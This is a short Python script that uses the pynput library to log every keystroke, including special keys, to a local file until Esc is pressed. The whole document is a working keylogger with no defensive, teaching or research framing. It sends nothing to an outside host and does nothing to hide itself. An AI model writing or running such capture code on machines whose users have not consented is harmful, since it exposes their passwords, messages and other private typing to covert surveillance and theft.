from pynput import keyboard

# Initialize the log file
with open("log.txt", "w") as log:
    log.write("")

def on_press(key):
    try:
        with open("log.txt", "a") as log:
            # Write the character pressed
            log.write(f"{key.char}\n")
    except AttributeError:
        # Handle special keys
        with open("log.txt", "a") as log:
            log.write(f"[{key}]\n")
    return True

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()